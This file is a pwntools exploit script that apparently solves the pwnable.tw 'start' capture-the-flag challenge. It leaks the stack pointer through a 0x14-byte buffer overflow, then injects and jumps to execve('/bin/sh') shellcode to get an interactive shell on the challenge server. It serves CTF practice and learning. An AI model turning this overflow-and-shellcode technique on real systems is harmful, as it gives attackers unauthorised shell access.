"""
 8048087:       89 e1                   mov    ecx,esp
 8048089:       b2 14                   mov    dl,0x14
 804808b:       b3 01                   mov    bl,0x1
 804808d:       b0 04                   mov    al,0x4
 804808f:       cd 80                   int    0x80
 8048091:       31 db                   xor    ebx,ebx
 8048093:       b2 3c                   mov    dl,0x3c
 8048095:       b0 03                   mov    al,0x3
 8048097:       cd 80                   int    0x80
 8048099:       83 c4 14                add    esp,0x14
 804809c:       c3                      ret    

espのリーク
シェルコードの起動
"""

from pwn import *
#context.log_level = 'debug'
p = remote("chall.pwnable.tw", 10000 )
#p = remote("localhost", 7777 )

payload = b''
payload += b'A' * 0x14
payload += p32( 0x8048087 ) #return => esp leak; read( 0x3c )

p.recvuntil("the CTF:")
p.send( payload )
esp = u32( p.recv(4) )
info("esp :%#x", esp )

shellcode = asm( '\n'.join([
'push %d'%u32(b'/sh\0'),
'push %d'%u32(b'/bin'),
'xor edx, edx',
'xor ecx, ecx',
'mov ebx, esp',
'mov eax, 0x0b',
'int 0x80'
]) )
info( "shellcode :%s", shellcode )

payload = b''
payload += b'A' * 0x14
payload += p32( esp + 0x14 ) #return => すぐ下のアドレスにリターン
payload += shellcode

p.send( payload )
p.interactive()
